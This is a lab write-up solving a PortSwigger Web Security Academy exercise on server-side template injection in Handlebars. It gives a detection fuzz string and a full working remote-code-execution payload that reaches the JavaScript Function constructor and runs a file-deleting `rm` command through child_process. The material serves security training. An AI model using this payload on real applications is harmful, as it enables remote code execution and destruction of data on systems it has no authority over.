# Lab 04 — SSTI in an unknown language with a documented exploit

> **Expert** · [Official lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

**Entry point:** `GET /?message=` · **Engine:** Handlebars (Node.js).

## Solution

1. Detect — inject the generic fuzz string:

```
${{<%[%'"}}%\
```

The error identifies **Handlebars**.

2. Find the documented exploit — search for *"Handlebars server-side template
   injection"* (the well-known @Zombiehelp54 RCE) and adapt it to run
   `require('child_process').exec('rm /home/carlos/morale.txt')`.
3. The adapted payload (URL-encode fully, including line breaks as `%0d%0a`)
   placed in `message`:

```
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
```

4. Load the URL — the command runs — lab solved.

## Notes

The chain abuses `string.sub`'s `constructor` to reach the JavaScript
`Function` constructor — no sandbox in Handlebars stops it.
